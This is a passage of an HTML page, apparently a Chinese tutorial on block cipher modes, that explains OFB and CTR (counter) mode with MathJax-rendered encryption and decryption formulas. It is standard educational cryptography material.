52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7594.5, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(8650.3, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9273.1, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(10328.9, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(10928.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<p><img src="https://gitee.com/auxein/images/raw/master/BlockCipher/OFB.png"></p>
<ul>
<li><p>OFB模式要求在密钥相同的情况下，每次加密必须使用不同的IV，否则消息的机密性就得不到保障。</p>
</li>
<li><p>OFB具有普通序列密码的优缺点，可加密任意长度的数据，没有错误传播，适于加密冗余度较大的数据，但对密文的篡改难以检测</p>
</li>
</ul>
<h3 id="计数器模式（Counter-Mode）"><a href="#计数器模式（Counter-Mode）" class="headerlink" title="计数器模式（Counter Mode）"></a>计数器模式（Counter Mode）</h3><p>CBC模式和CFB模式都不能以随机顺序来访问加密的数据，因为当前密文数据块的解密依赖于前面的密文块。</p>
<p>CTR模式不是用加密算法的输出填充寄存器，而是将一个计数器输入到寄存器中。每一个分组完成加密后，计数器都要增加某个常数，典型值是1，其加解密公式如下：</p>
<p>加密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="36.937ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 16326 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2342.5, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3773.1, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(5450.8, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g><g data-mml-node="mo" transform="translate(6867.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7256.4, 0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(8016.4, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(8720.4, 0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mo" transform="translate(9701.6, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(10701.9, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11046.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11435.9, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(11824.9, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(12602.6, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(13658.4, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(14281.2, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(15337, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(15937, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>解密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="36.937ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 16326 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1541.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2597.5, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3773.1, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(5450.8, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g><g data-mml-node="mo" transform="translate(6867.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7256.4, 0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(8016.4, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(8720.4, 0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mo" transform="translate(9701.6, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(10701.9, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11046.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 